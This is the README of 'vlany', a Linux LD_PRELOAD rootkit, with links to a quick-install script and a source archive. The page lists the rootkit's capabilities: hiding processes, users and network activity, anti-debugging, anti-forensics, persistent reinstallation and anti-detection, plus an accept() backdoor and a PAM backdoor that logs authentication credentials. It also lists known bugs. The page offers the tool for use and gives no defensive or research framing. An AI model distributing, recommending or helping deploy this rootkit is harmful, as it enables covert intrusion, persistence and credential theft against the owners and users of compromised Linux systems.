#Vlany
##A Linux (LD_PRELOAD) rootkit


#Downloads
[quick_install.sh](https://gist.githubusercontent.com/mempodippy/d93fd99164bace9e63752afb791a896b/raw/6b06d235beac8590f56c47b7f46e2e4fac9cf584/quick_install.sh)</br>
[vlany.tar.gz](https://github.com/mempodippy/vlany/archive/master.tar.gz)</br>


##Features
  * Process hiding
  * User hiding
  * Network hiding
  * LXC container
  * Anti-Debug
  * Anti-Forensics
  * Persistent (re)installation & Anti-Detection
  * backdoors
    * accept() backdoor (deprived from Jynx2)
    * PAM backdoor
      * PAM auth logger
  * vlany-exclusive commands

##Known bugs
###Serious bugs
> 1. There is currently only one significant bug in vlany, which unfortunately causes the box to be unable to reboot successfully.
> This bug arises from hide_checks.c @ hidden_xattr. It'll get fixed.

###Minor bugs
> 1. There is a [weird bug](https://github.com/mempodippy/vlany/issues/4) where it shows a duplicate line in the w / who commands.

##[In-depth README.txt](https://raw.githubusercontent.com/mempodippy/vlany/master/README)</br>
